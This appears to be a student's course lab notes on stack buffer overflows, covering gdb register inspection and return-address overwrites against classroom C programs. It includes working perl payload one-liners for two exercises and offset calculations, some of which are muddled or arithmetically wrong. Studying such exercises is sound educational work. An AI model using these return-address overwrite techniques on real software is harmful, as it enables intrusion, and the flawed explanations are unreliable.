# Week 3


gdb commands:\
step\
run\
break\
x/8x $esp\
info registers\
disas main


### Task1
In this task, find the ESP, EBP and Return address in the stack frames of the following functions: main, func1, and func2 when the following code is compiled and executed.

<p align='center'>
<img src="https://github.com/LouisXVBTW/Vulnerability-Discovery-And-Exploitation/blob/main/images/week3task1a.png">
</p>

|Main Register|Main Address|
|:-----------:|-----------:|
|esp |0xffffd020|
|ebp|0xffffd038|
|main rtn|0x56556276|

|Fun1 Registers|Fun1 Address|
|:-----------:|-----------:|
|esp|0xffffd000|
|ebp|0xffffd018|
|fun1 rtn|0x5655622b|

|Fun2 Registers|Fun2 Address|
|:------:|-----:|
|esp|0xffffcfe0|
|ebp|0xffffcfe8|
|fun2 rtn|0x565561fc|

### Task2
In this task, discover buffer overflow vulnerability and exploit the program of the following code (i.e. print out the following message in the terminal “You have correctly ...Well done!”)

<p align='center'>
<img src="https://github.com/LouisXVBTW/Vulnerability-Discovery-And-Exploitation/blob/main/images/week3task2.png">
</p>

### Task 3
In this task, discover buffer overflow vulnerability and exploit the program of the following code (e.g. executing the for loop in the vde_msg() function)


task3:
perl -e 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; print "\xc9\x61\x55\x56";' > /tmp/task3input

the ending is the return address being replaced with the address of the function we want to run

in this case the addr is 0x565561c9 but we need to reverse it and then overflow to it
idk why we need to reverse it but we do. 44 A's and the addr

<p align='center'>
<img src="https://github.com/LouisXVBTW/Vulnerability-Discovery-And-Exploitation/blob/main/images/week3task3a.png">
<img src="https://github.com/LouisXVBTW/Vulnerability-Discovery-And-Exploitation/blob/main/images/week3task3b.png">
</p>


### Additional Task
Download the serial.c file from moodle. Then compile it and run the program. Try various inputs and see if you can discover any vulnerability and exploit the program (i.e. print the “The serial number is valid” on the command line).

(need to do)

**We can skip all validation and end up in the address of the final correct function.**
the input function is designated as a 24 char buffer inside the **validate_serial()** function.

when we are in the funtion using gdb we can type `i r` for (information registers) and check the esp & ebp. The ebp is 4 above the return address as the return address will always be stored in **ebp+4**. 

<p align='center'>
<img src="https://github.com/LouisXVBTW/Vulnerability-Discovery-And-Exploitation/blob/main/images/week3task4a.png">
</p>

Here you can see we inputed "aaaa" and the esp/ebp currently is:
esp            0xffffcd80          0xffffcd80
ebp            0xffffcda8          0xffffcda8

and the serial function is at: 
(gdb) print &serial
$1 = (char (*)[24]) 0xffffcd88

if we **0xa8-0x84**(this is the addr of serial so we -4 to count from the start of the bytes) we get **169 - 132 = 36** and since the return address is **ebp+4** the next 4 bytes of the overflow needs to be the address we want and it has to be backwards.

(gdb) disas do_valid_stuff
Dump of assembler code for function do_valid_stuff:
   **0x565562d3** <+0>:     push   ebp

so with perl -e ' print "A"x36;print"\xd3\x62\x55\x56";' > file
we can input the output into the program and it will successd

<p align='center'>
<img src="https://github.com/LouisXVBTW/Vulnerability-Discovery-And-Exploitation/blob/main/images/week3task4b.png">
</p>